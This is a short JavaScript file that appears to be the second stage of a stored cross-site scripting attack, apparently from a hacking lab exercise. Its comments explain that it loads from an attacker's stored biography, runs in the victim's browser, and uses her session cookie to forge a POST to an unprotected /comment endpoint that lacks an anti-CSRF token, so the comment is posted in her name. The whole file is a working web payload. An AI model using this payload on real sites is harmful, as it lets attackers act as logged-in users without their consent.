// STAGE 2 — runs in Jeni's browser when she loads /biographies (the only page she visits).
// It is loaded from inside Pepe's stored bio. It forges a comment POST as Jeni, so she
// "leaves a comment" without ever opening the /comments section.
//
// The comment endpoint is trivial to forge: POST /comment,
// Content-Type: application/x-www-form-urlencoded, single field `content`, no anti-CSRF token.
// Because the fetch is same-origin, Jeni's session cookie is attached automatically.

(async () => {
    await fetch("/comment", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "content=" + encodeURIComponent("jeni estuvo aca - pwned by hacklab")
    });
})();
